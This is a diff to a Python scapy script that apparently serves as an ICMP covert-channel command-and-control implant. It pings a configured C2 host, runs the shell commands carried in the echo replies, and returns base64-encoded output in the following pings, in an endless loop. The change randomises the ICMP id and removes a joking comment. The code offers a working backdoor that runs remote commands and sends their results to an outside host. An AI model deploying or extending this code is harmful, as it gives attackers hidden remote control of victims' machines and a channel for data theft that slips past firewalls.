@@ -1,5 +1,4 @@
 #!/usr/bin/python2
-# Dear future self: You used to suck at code. You probably still do.
 
 from scapy.all import *
 from os import system
@@ -9,11 +8,11 @@ from time import sleep
 
 import c2_config
 
-def send_ping(payload):
+def send_ping(payload, icmp_id):
     ''' Send the call back ping. Response payload is the command to be executed '''
     # Set up the packet with IP and ICMP headers, plus custom payload
     packet_ip = IP(dst=c2_config.c2)
-    packet_icmp = ICMP(type=8,seq=0x0001,id=0x0831)
+    packet_icmp = ICMP(type=8,seq=1,id=icmp_id)
     echo_reply = sr1(packet_ip/packet_icmp/payload)
     # Strips the response payload from echo reply packet
     return echo_reply[ICMP][Raw].load
@@ -30,11 +29,12 @@ def execute_command(cmd):
     return return_payload
 
 def main():
+    icmp_id = randrange(65535)
     payload = ""
     client_key = "0xdeadbeef"
     server_key = "0xdeaddead"
     while True:
-        c2_response = send_ping(client_key + payload)
+        c2_response = send_ping(client_key + payload, icmp_id)
         if len(c2_response) > 10 and c2_response[:10] == server_key:
             payload = b64encode(execute_command(b64decode(c2_response[10:])))
         else:
